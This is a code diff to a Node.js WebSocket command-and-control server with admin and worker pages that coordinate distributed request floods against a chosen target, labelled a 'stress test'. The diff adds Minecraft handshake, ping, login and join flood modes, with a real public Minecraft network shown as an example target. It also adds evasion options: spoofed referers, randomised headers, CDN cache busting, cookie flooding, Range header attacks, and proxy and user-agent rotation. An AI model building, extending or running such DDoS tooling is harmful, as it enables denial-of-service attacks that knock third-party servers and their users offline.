@@ -261,6 +261,7 @@ const adminHTML = `<!DOCTYPE html>
 <body>
     <div class="connection-status" id="connStatus">DISCONNECTED</div>
     
+    <!-- Attack Summary Modal -->
     <div class="summary-modal" id="summaryModal">
         <div class="summary-content">
             <div class="summary-title">⚡ ATTACK SUMMARY</div>
@@ -330,7 +331,15 @@ const adminHTML = `<!DOCTYPE html>
                     <option value="xmlrpc">XML-RPC Flood</option>
                     <option value="api-abuse">API Abuse</option>
                     <option value="cache-bypass">Advanced Cache Bypass</option>
+                    <option value="minecraft-handshake">Minecraft Handshake Flood</option>
+                    <option value="minecraft-ping">Minecraft Ping Flood</option>
+                    <option value="minecraft-login">Minecraft Login Spam</option>
+                    <option value="minecraft-join">Minecraft Join Flood</option>
                 </select>
+            </div>
+            <div class="form-group" id="minecraftPortGroup" style="display: none;">
+                <label>Minecraft Server Port</label>
+                <input type="number" id="minecraftPort" value="25565" min="1" max="65535">
             </div>
             <div class="form-group">
                 <label>Attack Duration (seconds)</label>
@@ -343,6 +352,58 @@ const adminHTML = `<!DOCTYPE html>
             <div class="form-group">
                 <label>Delay between requests (ms)</label>
                 <input type="number" id="delay" value="1" min="0">
+            </div>
+            
+            <h3 style="margin: 25px 0 15px; color: #00ff41; font-size: 16px;">Bypass Methods</h3>
+            
+            <div class="form-group" style="display: flex; align-items: center; margin-bottom: 10px;">
+                <input type="checkbox" id="bypassDNS" style="width: auto; margin-right: 10px;">
+                <label style="margin: 0; cursor: pointer;" for="bypassDNS">DNS Bypass (Pre-resolve IPs)</label>
+            </div>
+            
+            <div class="form-group" style="display: flex; align-items: center; margin-bottom: 10px;">
+                <input type="checkbox" id="randomHeaders" style="width: auto; margin-right: 10px;">
+                <label style="margin: 0; cursor: pointer;" for="randomHeaders">Random Headers (Anti-fingerprint)</label>
+            </div>
+            
+            <div class="form-group" style="display: flex; align-items: center; margin-bottom: 10px;">
+                <input type="checkbox" id="randomReferer" style="width: auto; margin-right: 10px;">
+                <label style="margin: 0; cursor: pointer;" for="randomReferer">Random Referer (Spoof source)</label>
+            </div>
+            
+            <div class="form-group" style="display: flex; align-items: center; margin-bottom: 10px;">
+                <input type="checkbox" id="cacheBust" style="width: auto; margin-right: 10px;">
+                <label style="margin: 0; cursor: pointer;" for="cacheBust">Cache Busting (Bypass CDN cache)</label>
+            </div>
+            
+            <div class="form-group" style="display: flex; align-items: center; margin-bottom: 10px;">
+                <input type="checkbox" id="randomParams" style="width: auto; margin-right: 10px;">
+                <label style="margin: 0; cursor: pointer;" for="randomParams">Random Query Params</label>
+            </div>
+            
+            <div class="form-group" style="display: flex; align-items: center; margin-bottom: 10px;">
+                <input type="checkbox" id="cookieFlood" style="width: auto; margin-right: 10px;">
+                <label style="margin: 0; cursor: pointer;" for="cookieFlood">Cookie Flooding</label>
+            </div>
+            
+            <div class="form-group" style="display: flex; align-items: center; margin-bottom: 10px;">
+                <input type="checkbox" id="rangeHeader" style="width: auto; margin-right: 10px;">
+                <label style="margin: 0; cursor: pointer;" for="rangeHeader">Range Header Attack</label>
+            </div>
+            
+            <div class="form-group" style="display: flex; align-items: center; margin-bottom: 10px;">
+                <input type="checkbox" id="useProxy" style="width: auto; margin-right: 10px;">
+                <label style="margin: 0; cursor: pointer;" for="useProxy">Use Proxies (from proxies.txt)</label>
+            </div>
+            
+            <div class="form-group" style="display: flex; align-items: center; margin-bottom: 10px;">
+                <input type="checkbox" id="rotateUserAgent" style="width: auto; margin-right: 10px;">
+                <label style="margin: 0; cursor: pointer;" for="rotateUserAgent">Rotate User-Agent (from headers.txt)</label>
+            </div>
+            
+            <div class="form-group">
+                <label>POST Data (optional, for POST/PUT requests)</label>
+                <input type="text" id="postData" placeholder='{"key": "value"}' value="">
             </div>
             
             <div style="margin-top: 20px;">
@@ -377,9 +438,9 @@ const adminHTML = `<!DOCTYPE html>
     <script>
         let ws;
         let workers = [];
-        let currentConfig = null;
 
         function connect() {
+            // Use correct WebSocket protocol based on page protocol
             const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
             const wsUrl = protocol + '//' + window.location.host;
             
@@ -391,6 +452,7 @@ const adminHTML = `<!DOCTYPE html>
                 document.getElementById('connStatus').textContent = 'CONNECTED';
                 document.getElementById('connStatus').className = 'connection-status connected';
                 ws.send(JSON.stringify({ type: 'identify', role: 'admin' }));
+                // Request status immediately and keep polling
                 requestStatus();
             };
 
@@ -416,10 +478,20 @@ const adminHTML = `<!DOCTYPE html>
                     console.log('Status received - workers:', data.workers);
                     workers = data.workers || [];
                     updateWorkersDisplay();
+                    // Update worker count immediately
                     document.getElementById('workerCount').textContent = workers.length;
                     break;
                 case 'worker_stats':
                     updateWorkerStats(data.workerId, data.stats);
+                    // Update worker info if provided
+                    const worker = workers.find(w => w.id === data.workerId);
+                    if (worker) {
+                        if (data.currentUA) worker.currentUA = data.currentUA;
+                        if (data.currentProxy) worker.currentProxy = data.currentProxy;
+                        if (data.uaCount !== undefined) worker.uaCount = data.uaCount;
+                        if (data.proxyCount !== undefined) worker.proxyCount = data.proxyCount;
+                        updateWorkersDisplay();
+                    }
                     break;
                 case 'test_started':
                     document.getElementById('testStatus').textContent = 'RUNNING';
@@ -430,28 +502,32 @@ const adminHTML = `<!DOCTYPE html>
                     document.getElementById('testStatus').textContent = 'IDLE';
                     document.getElementById('startBtn').disabled = false;
                     document.getElementById('stopBtn').disabled = true;
+                    // Update final stats if provided
                     if (data.finalStats) {
                         data.finalStats.forEach(w => {
                             updateWorkerStats(w.id, w.stats);
                         });
                     }
+                    // Show summary report
                     if (data.summary) {
                         showSummary(data.summary);
                     }
                     break;
                 case 'client_disconnected':
+                    // Update final stats before removing worker
                     if (data.finalStats) {
                         updateWorkerStats(data.finalStats.id, data.finalStats.stats);
                     }
                     setTimeout(() => {
                         workers = workers.filter(w => w.id !== data.clientId);
                         updateWorkersDisplay();
-                    }, 2000);
+                    }, 2000); // Keep stats visible for 2 seconds
                     break;
                 case 'workers_cleaned':
-                    requestStatus();
+                    requestStatus(); // Refresh worker list
                     break;
                 case 'worker_connected':
+                    // New worker connected - refresh list immediately
                     showNotification('⚡ New worker connected!');
                     requestStatus();
                     break;
@@ -477,7 +553,7 @@ const adminHTML = `<!DOCTYPE html>
             console.log('Updating display with', workerCount, 'workers:', workers);
             
             if (workerCount === 0) {
-                grid.innerHTML = '<div style="grid-column: 1/-1; text-align: center; color: #666; padding: 40px;">No workers connected. Open /worker page</div>';
+                grid.innerHTML = '<div style="grid-column: 1/-1; text-align: center; color: #666; padding: 40px;">No workers connected. Open /worker page or run node client.js</div>';
                 return;
             }
             
@@ -492,7 +568,7 @@ const adminHTML = `<!DOCTYPE html>
                     <div class="worker-card \${w.status === 'active' ? 'active' : ''}">
                         <div class="worker-id">Worker #\${w.id}</div>
                         <div class="worker-stat">Status: <span>\${w.status.toUpperCase()}</span></div>
-                        <div class="worker-stat">Threads: <span>\${currentConfig ? currentConfig.threads : '-'}</span></div>
+                        <div class="worker-stat">Threads: <span>\${config && config.threads || '-'}</span></div>
                         <div class="worker-stat">Sent: <span>\${w.stats.sent || 0}</span></div>
                         <div class="worker-stat">Success: <span>\${w.stats.success || 0}</span></div>
                         <div class="worker-stat">Failed: <span>\${w.stats.failed || 0}</span></div>
@@ -509,17 +585,31 @@ const adminHTML = `<!DOCTYPE html>
         }
 
         function startTest() {
+            const attackMode = document.getElementById('attackMode').value;
+            const isMinecraft = attackMode.startsWith('minecraft-');
+            
             const config = {
                 target: document.getElementById('targetUrl').value,
                 method: document.getElementById('method').value,
-                attackMode: document.getElementById('attackMode').value,
+                attackMode: attackMode,
                 duration: parseInt(document.getElementById('duration').value),
                 threads: parseInt(document.getElementById('threads').value),
-                delay: parseInt(document.getElementById('delay').value)
+                delay: parseInt(document.getElementById('delay').value),
+                bypassDNS: document.getElementById('bypassDNS').checked,
+                randomHeaders: document.getElementById('randomHeaders').checked,
+                randomReferer: document.getElementById('randomReferer').checked,
+                cacheBust: document.getElementById('cacheBust').checked,
+                randomParams: document.getElementById('randomParams').checked,
+                cookieFlood: document.getElementById('cookieFlood').checked,
+                rangeHeader: document.getElementById('rangeHeader').checked,
+                useProxy: document.getElementById('useProxy').checked,
+                rotateUserAgent: document.getElementById('rotateUserAgent').checked,
+                postData: document.getElementById('postData').value,
+                minecraftPort: isMinecraft ? parseInt(document.getElementById('minecraftPort').value) : 25565
             };
             
             if (!config.target) {
-                alert('Please enter a target URL');
+                alert('Please enter a target URL or IP address');
                 return;
             }
             
@@ -533,9 +623,20 @@ const adminHTML = `<!DOCTYPE html>
                 return;
             }
             
-            currentConfig = config;
             ws.send(JSON.stringify({ type: 'start_test', config }));
         }
+
+        // Show/hide Minecraft port field based on attack mode
+        document.getElementById('attackMode').addEventListener('change', function() {
+            const isMinecraft = this.value.startsWith('minecraft-');
+            document.getElementById('minecraftPortGroup').style.display = isMinecraft ? 'block' : 'none';
+            
+            if (isMinecraft) {
+                document.getElementById('targetUrl').placeholder = 'mc.hypixel.net or 192.168.1.1';
+            } else {
+                document.getElementById('targetUrl').placeholder = 'https://example.com';
+            }
+        });
 
         function stopTest() {
             ws.send(JSON.stringify({ type: 'stop_test' }));
@@ -544,6 +645,9 @@ const adminHTML = `<!DOCTYPE html>
         function requestStatus() {
             if (ws && ws.readyState === WebSocket.OPEN) {
                 ws.send(JSON.stringify({ type: 'get_status' }));
+            } else if (!ws || ws.readyState === WebSocket.CLOSED) {
+                // Try to reconnect if disconnected
+                connect();
             }
         }
 
@@ -573,6 +677,7 @@ const adminHTML = `<!DOCTYPE html>
             document.getElementById('summaryModal').className = 'summary-modal';
         }
 
+        // Poll for status every 2 seconds
         setInterval(() => {
             requestStatus();
         }, 2000);
@@ -713,11 +818,9 @@ const workerHTML = `<!DOCTYPE html>
         let isRunning = false;
         let stats = { sent: 0, success: 0, failed: 0 };
         let currentConfig = null;
-        let activeThreads = [];
 
         function connect() {
-            const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
-            ws = new WebSocket(protocol + '//' + window.location.host);
+            ws = new WebSocket('ws://' + window.location.host);
             
             ws.onopen = () => {
                 log('Connected to command server');
@@ -754,19 +857,20 @@ const workerHTML = `<!DOCTYPE html>
         }
 
         async function startAttack(config) {
-            if (isRunning) {
-                log('Attack already running, ignoring duplicate start');
-                return;
-            }
-            
             isRunning = true;
-            activeThreads = [];
             stats = { sent: 0, success: 0, failed: 0 };
             updateStatus('active', 'ATTACKING ' + config.target);
             
             log(\`Starting attack: \${config.duration}s duration with \${config.threads} threads\`);
             
-            // Start stat reporting interval
+            const endTime = Date.now() + (config.duration * 1000);
+            const threads = [];
+            
+            // Create worker threads
+            for (let i = 0; i < config.threads; i++) {
+                threads.push(attackThread(config, endTime));
+            }
+            
             const statsInterval = setInterval(() => {
                 if (isRunning) {
                     updateStatsDisplay();
@@ -774,27 +878,21 @@ const workerHTML = `<!DOCTYPE html>
                 }
             }, 500);
             
-            // Create worker threads - they'll run indefinitely until stopped
-            for (let i = 0; i < config.threads; i++) {
-                const threadPromise = attackThread(config);
-                activeThreads.push(threadPromise);
-            }
-            
-            // Wait for all threads to complete (they'll only complete when stopped)
-            await Promise.all(activeThreads);
+            await Promise.all(threads);
             clearInterval(statsInterval);
             
-            // Send final stats
-            reportStats();
+            reportStats(); // Send final stats
             updateStatsDisplay();
             
-            log('Attack completed');
-            updateStatus('idle', 'IDLE - Attack completed');
+            if (isRunning) {
+                log('Attack completed');
+                updateStatus('idle', 'IDLE - Attack completed');
+                isRunning = false;
+            }
         }
 
-        async function attackThread(config) {
-            // Run continuously until stopped
-            while (isRunning) {
+        async function attackThread(config, endTime) {
+            while (isRunning && Date.now() < endTime) {
                 await sendRequest(config);
                 if (config.delay > 0) {
                     await sleep(config.delay);
@@ -803,9 +901,9 @@ const workerHTML = `<!DOCTYPE html>
         }
 
         async function sendRequest(config) {
-            if (!isRunning) return;
-            
             stats.sent++;
+            updateStatsDisplay();
+            reportStats();
             
             try {
                 const response = await fetch(config.target, {
@@ -814,22 +912,16 @@ const workerHTML = `<!DOCTYPE html>
                 });
                 
                 stats.success++;
+                updateStatsDisplay();
                 
             } catch (error) {
                 stats.failed++;
+                updateStatsDisplay();
             }
         }
 
         function stopAttack() {
-            if (!isRunning) return;
-            
-            log('Stopping attack...');
             isRunning = false;
-            activeThreads = [];
-            
-            // Send final stats
-            reportStats();
-            updateStatsDisplay();
             updateStatus('idle', 'IDLE - Stopped');
         }
 
@@ -888,7 +980,7 @@ const workerHTML = `<!DOCTYPE html>
         connect();
     </script>
 </body>
-</html>\`;
+</html>`;
 
 // HTTP Server
 const server = http.createServer((req, res) => {
@@ -909,6 +1001,7 @@ const wss = new WebSocket.Server({
   server,
   clientTracking: true,
   perMessageDeflate: false,
+  // Add these options for Render compatibility
   verifyClient: (info) => true,
   handleProtocols: (protocols, request) => protocols[0]
 });
@@ -945,7 +1038,7 @@ setInterval(() => {
     if (client.ws.readyState === WebSocket.CLOSED || client.ws.readyState === WebSocket.CLOSING) {
       clients.delete(id);
       removedCount++;
-      console.log(\`[x] Removed dead client #\${id}\`);
+      console.log(`[x] Removed dead client #${id}`);
     }
   });
   
@@ -971,7 +1064,7 @@ wss.on('connection', (ws) => {
   };
   
   clients.set(clientId, clientInfo);
-  console.log(\`[+] Client #\${clientId} connected\`);
+  console.log(`[+] Client #${clientId} connected`);
 
   ws.on('message', (message) => {
     try {
@@ -979,16 +1072,18 @@ wss.on('connection', (ws) => {
       
       if (data.type === 'identify') {
         clientInfo.type = data.role;
-        console.log(\`[i] Client #\${clientId} -> \${data.role}\`);
+        console.log(`[i] Client #${clientId} -> ${data.role}`);
         
         if (data.role === 'admin') {
           sendStatus(ws);
         } else if (data.role === 'worker') {
           ws.send(JSON.stringify({ type: 'ready' }));
+          // Notify all admins that a new worker connected
           broadcastToAdmins({
             type: 'worker_connected',
             workerId: clientId
           });
+          // Also send updated status to all admins
           setTimeout(() => {
             clients.forEach((client) => {
               if (client.type === 'admin' && client.ws.readyState === WebSocket.OPEN) {
@@ -1013,10 +1108,18 @@ wss.on('connection', (ws) => {
       
       if (data.type === 'stats' && clientInfo.type === 'worker') {
         clientInfo.stats = data.stats;
+        clientInfo.currentUA = data.currentUA || 'Unknown';
+        clientInfo.currentProxy = data.currentProxy || 'Direct';
+        clientInfo.uaCount = data.uaCount || 0;
+        clientInfo.proxyCount = data.proxyCount || 0;
         broadcastToAdmins({
           type: 'worker_stats',
           workerId: clientId,
-          stats: data.stats
+          stats: data.stats,
+          currentUA: data.currentUA,
+          currentProxy: data.currentProxy,
+          uaCount: data.uaCount,
+          proxyCount: data.proxyCount
         });
       }
       
@@ -1026,8 +1129,9 @@ wss.on('connection', (ws) => {
   });
 
   ws.on('close', () => {
-    console.log(\`[-] Client #\${clientId} disconnected (type: \${clientInfo.type || 'unknown'})\`);
+    console.log(`[-] Client #${clientId} disconnected (type: ${clientInfo.type || 'unknown'})`);
     
+    // Keep the final stats before removing
     const finalStats = {
       id: clientId,
       type: clientInfo.type,
@@ -1042,6 +1146,7 @@ wss.on('connection', (ws) => {
       finalStats 
     });
     
+    // Update all admin panels
     setTimeout(() => {
       clients.forEach((client) => {
         if (client.type === 'admin' && client.ws.readyState === WebSocket.OPEN) {
@@ -1052,13 +1157,13 @@ wss.on('connection', (ws) => {
   });
 
   ws.on('error', (error) => {
-    console.error(\`[!] WebSocket error on client #\${clientId}:\`, error.message);
+    console.error(`[!] WebSocket error on client #${clientId}:`, error.message);
   });
 });
 
 function startStressTest(config) {
   activeTest = config;
-  console.log(\`[!] Starting stress test on \${config.target}\`);
+  console.log(`[!] Starting stress test on ${config.target}`);
   
   const workers = Array.from(clients.values()).filter(c => c.type === 'worker');
   
@@ -1070,7 +1175,7 @@ function startStressTest(config) {
     return;
   }
   
-  console.log(\`[*] Attack started with \${workers.length} workers for \${config.duration}s\`);
+  console.log(`[*] Attack started with ${workers.length} workers for ${config.duration}s`);
   
   workers.forEach(worker => {
     worker.status = 'active';
@@ -1087,27 +1192,22 @@ function startStressTest(config) {
     config: config
   });
   
-  // Server-side timer: stop exactly after duration
+  // Auto-stop after duration and show report
   setTimeout(() => {
     if (activeTest) {
-      console.log('[!] Server timer: Attack duration completed - stopping all workers');
+      console.log('[!] Attack duration completed');
       stopStressTest();
     }
-  }, config.duration * 1000);
+  }, config.duration * 1000 + 2000); // Add 2 seconds buffer for final stats
 }
 
 function stopStressTest() {
-  if (!activeTest) {
-    console.log('[!] No active test to stop');
-    return;
-  }
-  
   console.log('[!] Stopping stress test');
   activeTest = null;
   
   const workers = Array.from(clients.values()).filter(c => c.type === 'worker');
   
-  // Collect final stats
+  // Collect final stats from all workers
   const finalStats = workers.map(w => ({
     id: w.id,
     stats: { ...w.stats }
@@ -1125,22 +1225,18 @@ function stopStressTest() {
   console.log('╔════════════════════════════════════════╗');
   console.log('║       ATTACK SUMMARY REPORT            ║');
   console.log('╠════════════════════════════════════════╣');
-  console.log(\`║  Total Requests Sent: \${totalSent.toString().padStart(16)} ║\`);
-  console.log(\`║  Successful:          \${totalSuccess.toString().padStart(16)} ║\`);
-  console.log(\`║  Failed:              \${totalFailed.toString().padStart(16)} ║\`);
-  console.log(\`║  Success Rate:        \${totalSent > 0 ? ((totalSuccess/totalSent)*100).toFixed(1) : '0'}%\`.padEnd(41) + '║');
-  console.log(\`║  Workers Used:        \${workers.length.toString().padStart(16)} ║\`);
+  console.log(`║  Total Requests Sent: ${totalSent.toString().padStart(16)} ║`);
+  console.log(`║  Successful:          ${totalSuccess.toString().padStart(16)} ║`);
+  console.log(`║  Failed:              ${totalFailed.toString().padStart(16)} ║`);
+  console.log(`║  Success Rate:        ${totalSent > 0 ? ((totalSuccess/totalSent)*100).toFixed(1) : '0'}%`.padEnd(41) + '║');
+  console.log(`║  Workers Used:        ${workers.length.toString().padStart(16)} ║`);
   console.log('╚════════════════════════════════════════╝');
   
-  // Send stop command to all workers
   workers.forEach(worker => {
     worker.status = 'idle';
-    if (worker.ws.readyState === WebSocket.OPEN) {
-      worker.ws.send(JSON.stringify({ type: 'stop' }));
-    }
+    worker.ws.send(JSON.stringify({ type: 'stop' }));
   });
   
-  // Broadcast summary to admins
   broadcastToAdmins({ 
     type: 'test_stopped',
     finalStats,
@@ -1171,7 +1267,7 @@ function sendStatus(ws) {
   
   try {
     ws.send(JSON.stringify(message));
-    console.log(\`[→] Sent status to admin: \${workers.length} workers\`);
+    console.log(`[→] Sent status to admin: ${workers.length} workers`);
   } catch (e) {
     console.error('[!] Failed to send status:', e.message);
   }
@@ -1186,14 +1282,14 @@ function broadcastToAdmins(data) {
 }
 
 server.listen(PORT, '0.0.0.0', () => {
-  console.log(\`
+  console.log(`
 ╔════════════════════════════════════════╗
 ║   STRESS TEST SERVER RUNNING           ║
 ╠════════════════════════════════════════╣
-║  Port: \${PORT}                            ║
-║  Environment: \${process.env.NODE_ENV || 'development'}              ║
-║  Admin: http://localhost:\${PORT}/admin    ║
-║  Worker: http://localhost:\${PORT}/worker  ║
+║  Port: ${PORT}                            ║
+║  Environment: ${process.env.NODE_ENV || 'development'}              ║
+║  Admin: http://localhost:${PORT}/admin    ║
+║  Worker: http://localhost:${PORT}/worker  ║
 ╚════════════════════════════════════════╝
-  \`);
+  `);
 });
